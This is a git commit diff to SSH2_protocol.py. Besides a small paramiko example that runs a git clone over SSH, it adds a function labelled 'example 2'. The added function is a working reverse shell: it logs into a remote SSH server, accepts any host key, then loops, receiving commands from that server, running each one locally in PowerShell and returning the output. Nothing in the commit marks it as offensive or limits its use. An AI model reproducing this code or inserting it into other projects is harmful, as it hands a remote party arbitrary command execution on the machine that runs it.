e86335462711391fc40dc01059c73a059bfd3d0a
rocketpy <dimitr.ushakov@gmail.com>
2023-11-14 00:16:50 +0200

    Update SSH2_protocol.py

--- SSH2_protocol.py
+++ SSH2_protocol.py
@@ -17,3 +17,25 @@ session = client.get_transport().open_session()
 AgentRequestHandler(session)
 
 session.exec_command("git clone https://my.git.repository/")
+
+
+# example 2
+import paramiko
+import subprocess
+
+def ssh_command(ip, port, user, passwd, command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(ip, port=port, username=user, password=passwd)
+    client.invoke_shell()
+
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command)
+    print(ssh_session.recv(1024).decode())
+
+    while True:
+        command = ssh_session.recv(1024) 
+        cmd = command.decode()
+        cmd_output = subprocess.run(['powershell', '-command', cmd], stdout=subprocess.PIPE, text=True)
+        ssh_session.send(cmd_output.stdout or 'None')
